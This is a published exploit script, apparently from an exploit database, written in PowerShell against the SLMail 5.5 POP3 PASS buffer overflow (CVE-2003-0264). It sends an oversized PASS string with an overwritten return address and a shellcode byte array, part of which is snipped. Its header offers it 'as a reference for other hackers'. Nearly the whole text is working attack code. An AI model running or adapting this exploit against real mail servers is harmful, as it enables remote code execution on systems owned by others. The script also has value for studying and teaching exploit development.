# Exploit Title: SLMail 5.5 POP3 PASS buffer overflow (PowerShell)
# Date: 2017-03-31
# Exploit Author: Simon Gurney
# Vendor Homepage:  http://www.seattlelab.com/
# Software Link: https://www.exploit-db.com/apps/12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe
# Version: 5.5
# Tested targets: Windows 7, Windows XP, Windows 10
# Tested PowerShell versions: 2, 5
# CVE-ID: CVE-2003-0264
 
# Credit to Muts for finding this vulnerability

# SLMail crashes with an overwritten EIP when sent a long PASS string 

# This exploit has been re-written in PowerShell as a reference for other hackers
# looking to write an exploit script with PowerShell.

   $target = “127.0.0.1”
    $username = "Hackor"
    $client = New-Object System.Net.Sockets.TcpClient $target, 110
    ### Create Stream and Read objects
    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader $stream
    $reader.ReadLine()     ### Receive banner
    $userCommand = [System.Text.Encoding]::ASCII.GetBytes("USER $username`r`n")
    $stream.Write($userCommand,0,$userCommand.length)     ### Send Username
    $reader.ReadLine()    ### Receive 
    [Byte[]]$payloadPrefix = [System.Text.Encoding]::ASCII.GetBytes("PASS " + ("A" * 2606))
    [Byte[]]$returnAddress = 0x8b,0x07,0x4c,0x5f #0x5f4c078b

###### SHELLCODE START- Bad Chars 0x00,0x0a,0x0d – 100 NOPs
    [Byte[]] $buf = 0x90,0x43,0x49,0x91,0xf9,0x37,0x92,0x99,0x93,0x41
    $buf += 0x9f,0xfd,0x43,0xf5,0x4b,0x49,0xf9,0xf5,0x49,0x37
    $buf += 0xf8,0xf9,0xf8,0x37,0xfc,0x93,0x92,0x93,0xfd,0x48
    … SNIP
    $buf += 0x85,0x5e,0x6b,0xfb,0x35,0xb5,0xa8,0x2,0xb6,0x3f
    $buf += 0x51,0xf1,0xa6,0x4a,0x54,0xbd,0x60,0xa7,0x24,0xae
    $buf += 0x4,0xc7,0x9b,0xcf,0xc
###### SHELLCODE END

    [Byte[]]$payload = $payloadPrefix+$returnAddress+$buf
    [Byte[]]$payload += [System.Text.Encoding]::ASCII.GetBytes(("C" * (3700 - $payload.Length - 2)) + "`r`n")
    Write-Host "Payload length is $($payload.Length)"
    $stream.Write($payload,0,$payload.length)
    ### Close Down
    $stream.Dispose()
    $client.Dispose() 

